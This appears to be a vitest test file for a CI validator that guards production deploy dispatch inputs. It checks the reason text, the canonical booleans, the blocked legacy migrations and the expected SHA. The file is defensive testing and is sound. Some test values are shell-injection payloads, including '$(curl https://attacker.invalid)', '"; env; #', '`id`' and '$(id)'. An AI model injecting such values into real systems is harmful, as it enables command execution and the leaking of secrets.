import { describe, expect, it } from 'vitest';
import { validateProductionDeployDispatch } from '../ci/validate-production-deploy-dispatch.mjs';

const valid = {
  ref: 'refs/heads/main',
  sha: 'a'.repeat(40),
  deployWorker: 'true',
  deployPages: 'false',
  runMigrations: 'false',
  expectedSha: 'a'.repeat(40),
  reason: 'Deploy the reviewed security release',
  confirmProduction: 'AIRTRUST_PRODUCTION',
};

describe('validateProductionDeployDispatch', () => {
  it('accepts a canonical reviewed dispatch', () => {
    expect(validateProductionDeployDispatch(valid)).toMatchObject({
      deployWorker: true,
      deployPages: false,
      sha: valid.sha,
    });
  });

  it.each(['$(curl https://attacker.invalid)', '"; env; #', '`id`', 'valid line\nsecond line'])(
    'keeps reason data out of shell code and rejects unsafe control payloads when applicable: %s',
    (reason) => {
      if (reason.includes('\n')) {
        expect(() => validateProductionDeployDispatch({ ...valid, reason })).toThrow(/reason/);
        return;
      }
      expect(validateProductionDeployDispatch({ ...valid, reason }).reason).toBe(reason);
    },
  );

  it('rejects non-canonical booleans and any legacy migration attempt', () => {
    expect(() => validateProductionDeployDispatch({ ...valid, deployWorker: 'true; id' })).toThrow(
      /canonical boolean/,
    );
    expect(() => validateProductionDeployDispatch({ ...valid, runMigrations: 'true' })).toThrow(
      /LEGACY_MIGRATION_RUNNER_DISABLED/,
    );
  });

  it('rejects a mismatched or malformed expected SHA', () => {
    expect(() =>
      validateProductionDeployDispatch({ ...valid, expectedSha: 'b'.repeat(40) }),
    ).toThrow(/does not match/);
    expect(() => validateProductionDeployDispatch({ ...valid, expectedSha: '$(id)' })).toThrow(
      /invalid/,
    );
  });
});
